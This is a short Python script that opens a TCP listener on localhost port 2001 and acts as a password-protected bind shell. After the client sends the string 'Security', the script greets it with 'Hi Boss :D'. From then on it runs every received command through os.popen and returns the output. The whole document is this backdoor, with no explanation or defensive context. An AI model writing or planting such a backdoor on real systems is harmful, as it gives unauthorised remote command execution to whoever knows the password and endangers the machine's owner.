#!/usr/bin/python

import socket,os

host = "localhost"
port = 2001
secret = "Security"
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.bind((host,port))
sock.listen(100)
while True:
    client , address = sock.accept()
    command = str(client.recv(1000)).strip("\n")
    if command == secret:
            client.send("Hi Boss :D\n")
            while True:
                command = client.recv(1000)
                result = os.popen(command).read()
                client.send(result)
